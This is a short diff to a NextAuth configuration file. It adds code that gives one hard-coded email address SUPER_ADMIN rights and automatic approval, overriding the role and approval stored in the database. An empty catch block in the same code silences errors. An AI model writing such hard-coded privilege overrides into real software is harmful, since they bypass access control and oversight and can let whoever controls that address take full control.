@@ -120,8 +120,9 @@ export const authOptions: NextAuthOptions = {
         try {
           const dbUser = await prisma.user.findUnique({ where: { id: token.userId as string } });
           if (dbUser) {
-             token.isApproved = dbUser.isApproved;
-             token.role = dbUser.role;
+             const isSuperAdmin = dbUser.email?.toLowerCase() === "rankved.business@gmail.com";
+             token.isApproved = isSuperAdmin ? true : dbUser.isApproved;
+             token.role = isSuperAdmin ? "SUPER_ADMIN" : dbUser.role;
           }
         } catch (e) {}
       }
